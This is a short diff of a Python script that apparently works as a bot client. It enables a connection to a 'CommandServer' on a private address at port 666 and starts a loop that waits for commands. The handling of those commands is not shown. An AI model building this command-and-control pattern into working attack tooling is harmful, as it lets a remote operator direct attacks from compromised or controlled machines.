@@ -7,6 +7,7 @@ import sys
 
 attack = None
 CommandServer = ('192.168.2.2', 666)
+#CommandServer = ('127.0.0.1', 666)
 
 def endProc(proc):
 	if proc != None:
@@ -15,7 +16,7 @@ def endProc(proc):
 
 if __name__=='__main__':
 	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	#server.connect(CommandServer)
+	server.connect(CommandServer)
 	# Listen for command from command server
 	while True:
 		data = server.recv(1024)
